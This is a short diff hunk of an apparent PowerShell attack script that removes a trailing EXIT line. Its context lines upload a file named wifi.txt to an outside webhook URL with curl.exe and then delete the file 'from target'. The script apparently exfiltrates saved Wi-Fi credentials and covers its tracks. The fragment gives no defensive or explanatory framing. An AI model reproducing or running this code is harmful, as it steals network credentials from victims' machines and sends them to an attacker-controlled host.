@@ -50,4 +50,3 @@ $file = Join-Path -Path $PWD -ChildPath "wifi.txt"
 curl.exe -F "file1=@$file" $webhookURL
 #Delete wifi.txt from target
 Remove-Item $file
-EXIT
